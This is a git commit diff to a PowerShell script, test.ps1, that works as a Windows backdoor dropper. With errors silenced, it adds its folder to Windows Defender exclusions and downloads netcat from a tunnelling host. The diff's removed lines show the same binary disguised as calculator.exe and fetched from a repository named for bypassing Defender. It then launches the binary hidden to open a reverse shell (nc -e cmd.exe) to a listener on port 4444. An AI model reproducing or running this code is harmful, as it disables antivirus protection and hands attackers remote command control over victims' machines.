bb0a7b12ef465db5a1f13fb4a27b9e578c04d7c8
Tech_kY <mr.annonymous2008@gmail.com>
2025-08-22 00:12:13 +0530

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,7 +1,8 @@
+cat test.ps1      
 $ErrorActionPreference = 'SilentlyContinue'
 
-$TempDir = "$env:TEMP\WinUpdateTemp"
-$NcPath = "$TempDir\calculator.exe"
+$TempDir = "C:\TempVBS"
+$NcPath = "$TempDir\nc.exe"
 
 try {
     New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
@@ -11,15 +12,13 @@ try {
     Add-MpPreference -ExclusionPath $TempDir
 } catch {}
 
-# Change the url with your actual link
 try {
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KaiKim2/WindowsDefenderBypassNetcat/main/calculator.exe" -OutFile $NcPath
+    Invoke-WebRequest -Uri "https://currently-marco-attempted-ours.trycloudflare.com/nc.exe" -OutFile $NcPath
 } catch {}
 
-# Change IP with the attacker machine's IP
 try {
     $WshShell = New-Object -ComObject WScript.Shell
-    $WshShell.Run("`"$NcPath`" 0.tcp.in.ngrok.io 18852 -e cmd.exe", 0, $false)
+    $WshShell.Run("`"$NcPath`" 192.168.0.115 4444 -e cmd.exe", 0, $false)
 } catch {}
 
 Start-Sleep -Seconds 5
